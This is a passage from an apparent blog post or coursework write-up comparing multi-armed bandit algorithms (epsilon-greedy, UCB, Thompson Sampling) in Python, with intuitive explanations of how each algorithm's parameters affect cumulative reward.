    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The optimal algorithm with the most cumulative reward is {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>optimal_algo<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"The maximum of cumulative reward is {:.4f}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>cumulative_reward<span class="token punctuation">[</span>optimal_algo<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<pre><code class="prism language-python">algo <span class="token operator">=</span> <span class="token punctuation">[</span>Greedy<span class="token punctuation">,</span> UCB<span class="token punctuation">,</span> TS<span class="token punctuation">,</span> Gradient<span class="token punctuation">]</span>
para <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0.1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
arms <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token punctuation">[</span>Bern_arm<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> arm_mean<span class="token punctuation">]</span><span class="token punctuation">)</span>

compare<span class="token punctuation">(</span>algo<span class="token punctuation">,</span>para<span class="token punctuation">,</span>arms<span class="token punctuation">,</span>num_exper<span class="token punctuation">,</span>N<span class="token punctuation">)</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/90/01/v6WeuQMe_o.png" alt="在这里插入图片描述"></p> 
<p>According to the result of the graph, we can also find that the <strong>Thompson Sampling</strong>(with para: {<!-- --><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        (
       
       
        
         α
        
        
         1
        
       
       
        ,
       
       
        
         β
        
        
         1
        
       
       
        )
       
       
        =
       
       
        (
       
       
        1
       
       
        ,
       
       
        1
       
       
        )
       
       
        ,
       
       
        (
       
       
        
         α
        
        
         2
        
       
       
        ,
       
       
        
         β
        
        
         2
        
       
       
        )
       
       
        =
       
       
        (
       
       
        1
       
       
        ,
       
       
        1
       
       
        )
       
       
        ,
       
       
        (
       
       
        
         α
        
        
         3
        
       
       
        ,
       
       
        
         β
        
        
         3
        
       
       
        )
       
       
        =
       
       
        (
       
       
        1
       
       
        ,
       
       
        1
       
       
        )
       
      
      
       (alpha_1,beta_1)=(1,1),(alpha_2,beta_2)=(1,1),(alpha_3,beta_3)=(1,1)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.0037em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.0037em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.0037em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>}) has the best performance among the three algorithms.</p> 
<h4>
<a id="2_The_impact_of_the_parameter_773"></a>2. The impact of the parameter</h4> 
<h4>
<a id="1circ_varepsilon_774"></a><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         1
        
        
         ∘
        
       
      
      
       1^{circ}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.674115em;vertical-align: 0em"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.674115em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∘</span></span></span></span></span></span></span></span></span></span></span></span></span> <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>
</h4> 
<p>The simulation above shows that when <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
       
        =
       
       
        0.2
       
      
      
       varepsilon = 0.2
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">2</span></span></span></span></span>, the <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>-Greedy algorithm performes best, so we can suppose that <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span> has negative correlation with the expected correlation.</p> 
<p>Then we prove the suppose by the definition of <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span>-Greedy in an intuitive degree:</p> 
<p>The value of <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span> decides the probability of exploration, the larger <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span> is, the more exploration occurs. In this question, exploiting will bring out more rewards than exploration, so <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
      
      
       varepsilon
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">ε</span></span></span></span></span> has negative correlation with the expected correlation is obvious intuitively.</p> 
<h4>
<a id="2circ_c_782"></a><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         2
        
        
         ∘
        
       
      
      
       2^{circ}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.674115em;vertical-align: 0em"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.674115em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∘</span></span></span></span></span></span></span></span></span></span></span></span></span> c</h4> 
<p>The simulation above shows that when <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        c
       
       
        =
       
       
        1
       
      
      
       c = 1
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">1</span></span></span></span></span>, the UCB algorithm performes best, so we can suppose that c has negative correlation with the expected correlation.</p> 
<p>Then we prove the suppose by the definition of UCB in an intuitive degree:</p> 
<p>Since <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         Q
        
        
         ^
        
       
       
        (
       
       
        a
       
       
        )
       
       
        +
       
       
        c
       
       
        
         
          
           −
          
          
           l
          
          
           o
          
          
           g
          
          
           t
          
         
         
          
           2
          
          
           
            N
           
           
            t
           
          
          
           (
          
          
           a
          
          
           )
          
         
        
       
      
      
       hat{Q}(a)+csqrt{frac{-logt}{2N_t(a)}}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.19677em;vertical-align: -0.25em"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.94677em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault">Q</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.19444em"><span class=""></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 1.84em;vertical-align: -0.648892em"></span><span class="mord mathdefault">c</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.19111em"><span class="svg-align"><span class="pstrut" style="height: 3.8em"></span><span class="mord" style="padding-left: 1em"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.932216em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right: 0.10903em">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.296343em"><span class="" style="margin-left: -0.10903em;margin-right: 0.0714286em"><span class="pstrut" style="height: 2.5em"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.143em"><span class=""></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathdefault mtight">a</span><span class="mclose mtight">)</span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight" style="margin-right: 0.01968em">l</span><span class="mord mathdefault mtight">o</span><span class="mord mathdefault mtight" style="margin-right: 0.03588em">g</span><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.52em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span class=""><span class="pstrut" style="height: 3.8em"></span><span class="hide-tail" style="min-width: 1.02em;height: 1.88em">
           
            
           </span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.648892em"><span class=""></span></span></span></span></span></span></span></span></span> is the upper bound of value function <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        Q
       
       
        (
       
       
        a
       
       
        )
       
      
      
       Q(a)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault">Q</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></span>, c indicates how much we trust the existing estimated value function of an action <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         Q
        
        
         ^
        
       
       
        (
       
       
        a
       
       
        )
       
      
      
       hat{Q}(a)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.19677em;vertical-align: -0.25em"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.94677em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord mathdefault">Q</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="accent-body">^</span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.19444em"><span class=""></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span></span></span></span></span>. The larger the value of c, the more uncertain we are about the existing estimated value function, which means we need to more exploration to validate the estimated value function.</p> 
<p>The value of <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        c
       
      
      
       c
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">c</span></span></span></span></span> represents the weight of exploration, the larger <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        c
       
      
      
       c
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">c</span></span></span></span></span> is, the more weight exploration has. In this question, exploiting will bring out more rewards than exploration, so c has negative correlation with the expected correlation is obvious intuitively.</p> 
<h4>
<a id="3circ_alpha_j_beta_j_792"></a><span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         3
        
        
         ∘
        
       
      
      
       3^circ
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.674115em;vertical-align: 0em"></span><span class="mord"><span class="mord">3</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.674115em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∘</span></span></span></span></span></span></span></span></span></span></span></span> <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         α
        
        
         j
        
       
       
        ,
       
       
        
         β
        
        
         j
        
       
      
      
       alpha_j, beta_j
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.980548em;vertical-align: -0.286108em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.0037em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span></span></span></span></span>
</h4> 
<p>The simulation above shows that when <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        b
       
       
        e
       
       
        t
       
       
        a
       
       
        1
       
       
        :
       
       
        (
       
       
        
         α
        
        
         1
        
       
       
        ,
       
       
        
         β
        
        
         1
        
       
       
        )
       
       
        =
       
       
        (
       
       
        
         α
        
        
         2
        
       
       
        ,
       
       
        
         β
        
        
         2
        
       
       
        )
       
       
        =
       
       
        (
       
       
        
         α
        
        
         3
        
       
       
        ,
       
       
        
         β
        
        
         3
        
       
       
        )
       
       
        =
       
       
        (
       
       
        1
       
       
        ,
       
       
        1
       
       
        )
       
      
      
       beta1: (alpha_1,beta_1) = (alpha_2,beta_2) = (alpha_3,beta_3) = (1,1)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.69444em;vertical-align: 0em"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord">1</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">:</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.0037em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.0037em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.0037em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span>, the Thompson Sampling algorithm performes best.</p> 
<p>Then we give an explanation by the definition of Beta Distribution in an intuitive degree:</p> 
<p>For Beta distribution, <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        α
       
      
      
       alpha
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.0037em">α</span></span></span></span></span> means the prior number of success, <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        β
       
      
      
       beta
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span></span></span></span></span> means the prior number of failure, the rate of success: <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         α
        
        
         
          α
         
         
          +
         
         
          β
         
        
       
      
      
       frac{alpha}{alpha+beta}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.1765em;vertical-align: -0.481108em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.695392em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right: 0.0037em">α</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right: 0.05278em">β</span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right: 0.0037em">α</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.481108em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span> is its mean. When the expectation of one arm is larger, the probability to choose the arm is larger. But if <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        α
       
       
        +
       
       
        β
       
      
      
       alpha+beta
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.66666em;vertical-align: -0.08333em"></span><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.05278em">β</span></span></span></span></span> is large, the variance of Beta Distribution is small.</p> 
<p>Thus, <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         α
        
        
         j
        
       
       
        ,
       
       
        
         β
        
        
         j
        
       
      
      
       alpha_j, beta_j
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.980548em;vertical-align: -0.286108em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.0037em">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.0037em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05278em">β</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: -0.05278em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span></span></span></span></span> is in fact a prior success and failure times, and have properties as below:</p> 
<p>(1) the larger the mean <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         α
        
        
         
          α
         
         
          +
         
         
          β
         
        
       
      
      
       frac{alpha}{alpha+beta}
      
     
